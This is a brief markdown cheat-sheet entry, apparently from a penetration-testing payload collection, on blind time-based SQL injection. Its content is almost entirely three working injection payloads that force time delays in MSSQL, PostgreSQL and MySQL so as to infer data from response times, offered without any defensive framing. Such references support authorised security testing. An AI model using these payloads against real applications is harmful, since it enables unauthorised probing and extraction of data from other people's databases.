# Blind Time-Based SQL Injection

## Summary
Infer data via time delays.

## Payloads
```sql
'; WAITFOR DELAY '0:0:5'-- - (MSSQL)
'||(SELECT pg_sleep(5))-- - (PostgreSQL)
' AND SLEEP(5)-- - (MySQL)
```
